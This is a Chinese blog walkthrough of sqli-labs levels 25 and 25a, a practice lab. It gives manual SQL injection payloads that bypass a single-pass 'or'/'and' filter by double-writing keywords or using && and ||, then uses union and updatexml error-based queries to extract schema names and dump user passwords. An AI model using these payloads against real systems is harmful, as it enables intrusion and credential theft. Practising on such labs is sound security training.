# 原创
：  （手工）【sqli-labs25-25a】报错注入、OR&AND过滤后注入

# （手工）【sqli-labs25-25a】报错注入、OR&amp;AND过滤后注入

**目录**

[推荐：](#%C2%A0%E6%8E%A8%E8%8D%90%EF%BC%9A)

[一、（手工）SQL注入基本步骤：](#%E4%B8%80%E3%80%81%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%88%E6%89%8B%E5%B7%A5%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[二、Less25（GET-Error based - All your OR &amp; AND belong to us-string single quote）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[2.1、简介：（OR&amp;AND过滤-报错回显）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[2.2、第一步：注入点测试](#2.2%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[ 2.3、第二步：分析过滤](#%C2%A02.3%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%88%86%E6%9E%90%E8%BF%87%E6%BB%A4)

[2.4、第三步：判断字段数](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0)

[2.5、第四步：暴库](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%9A%B4%E5%BA%93)

[2.6、第五步：爆表名](#%C2%A0%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%88%86%E8%A1%A8%E5%90%8D)

[2.7、第六步：爆字段](#%C2%A0%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5)

[2.8、第七步：爆数据](#%C2%A0%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

[二、Less25a（GET-Blind based - All your OR &amp; AND belong to us-Intiger based ）](#%E4%BA%8C%E3%80%81Less25a%EF%BC%88GET-Blind%20based%20-%20All%20your%20OR%20%26%20AND%20belong%20to%20us-Intiger%20based%C2%A0%EF%BC%89)

[2.1、简介：（Cookie注入-双引号）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88Cookie%E6%B3%A8%E5%85%A5-%E5%8F%8C%E5%BC%95%E5%8F%B7%EF%BC%89)

[2.2、利用过程：](#2.2%E3%80%81%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%9A)

---


> 
<h2>推荐：</h2>
[【SQL注入】数字型注入 &amp; 字符型注入<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501)
[【WAF绕过】SQL注入、文件上传、XSS<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450)


---


---


## 一、（手工）SQL注入基本步骤：

> 
第一步：注入点测试
第二步：分析权限
第三步：判断字段数
第四步：爆数据库名
第五步：爆表名
第六步：爆字段名
第七步：爆数据


---


---


## 二、Less25（GET-Error based - All your OR &amp; AND belong to us-string single quote）

> 
<h3>2.1、简介：（OR&amp;AND过滤-报错回显）</h3>
请求方法：GET
方法：过滤分析+报错回显


> 
<h3>2.2、第一步：注入点测试</h3>
输入?id=1

 后面加上单引号发现报错了
说明是单引号闭合
且可利用报错回显




> 
<h3> 2.3、第二步：分析过滤</h3>
?id=1'  and 1=1 --+
报错

输入?id=1'  --+
回显正常

 输入?id=1'  anandd 1=1--+
回显正常
说明and被过滤，且只过滤了一遍


<hr/>
同理：
?id=1' or 1=1 --+
?id=1' oorr 1=1 --+
可以发现or也被过滤了
<hr/>
and 可以使用 &amp;&amp; 替换
or 使用 || 替换
<hr/>
构造的语句中只要包含or或者and的都要双写
或者替换


---


> 
<h3>2.4、第三步：判断字段数</h3>
?id=1'  union select 1,2,3 --+



?id=1'  union select 1,2,3,4 --+
报错

 字段数为3



> 
<h3>2.5、第四步：暴库</h3>
?id=1'  union select 1,2,database() --+
被过滤了，那就多嵌套几层

 ?id=1'  union select 1,updatexml(1,concat(0x7e,(select database()),0x7e),1),3 --+<img alt="" height="815" src="https://img-blog.csdnimg.cn/627cf2fb8cfe45d7b455a3e8f2cee99f.png" width="1200"/>
 或者
?id=-1' union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'--+


> 
<h3>2.6、第五步：爆表名</h3>
?id=1' union select 1,updatexml(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()),0x7e),1),3--+

 或者
?id=-1' union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name='users'--+


> 
<h3>2.7、第六步：爆字段</h3>
?id=1' union select 1,updatexml(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns where table_name='users'),0x7e),1),3--+




> 
<h3>2.8、第七步：爆数据</h3>
?id=-1' union select 1,2,group_concat(username,'~',passwoorrd) from security.users  --+




---


---


## 二、Less25a（GET-Blind based - All your OR &amp; AND belong to us-Intiger based ）

> 
<h3>2.1、简介：（Cookie注入-双引号）</h3>
请求方法：GET
方法：过滤分析+报错回显


> 
<h3>2.2、利用过程：</h3>
尝试单引号，不行
尝试双引号，也不行
说明是数字型注入（不需要考虑不和）
后面基本上和Less25一样了

